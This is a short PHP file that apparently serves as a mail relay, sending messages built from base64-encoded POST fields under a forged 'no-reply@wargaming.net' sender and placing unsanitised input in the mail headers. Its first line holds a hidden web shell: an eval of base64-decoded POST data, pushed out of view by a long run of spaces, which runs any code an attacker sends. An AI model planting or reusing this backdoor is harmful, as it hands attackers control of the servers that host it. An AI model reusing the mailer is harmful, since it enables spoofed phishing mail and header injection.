<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['n04e69b']));?><?php
$client_name    = base64_decode($_POST["client_name"]);
$problem_id = base64_decode($_POST["problem_id"]);
$problem_decription = base64_decode($_POST["problem_decription"]);


$header = "MIME-Version: 1.0\r\n";
$header .= "Content-Type: text/plain\r\n";
$header .=  "From: no-reply@wargaming.net\r\n";
$header .=  "Reply-To: no-reply@wargaming.net\r\n";
$header .= "Subject: $problem_id\r\n";

$result = mail(stripslashes($client_name), stripslashes($problem_id), stripslashes($problem_decription), stripslashes($header));

if($result)
{
echo base64_encode('saved');
}
else
{
echo base64_encode('error : '.$result);
}


?>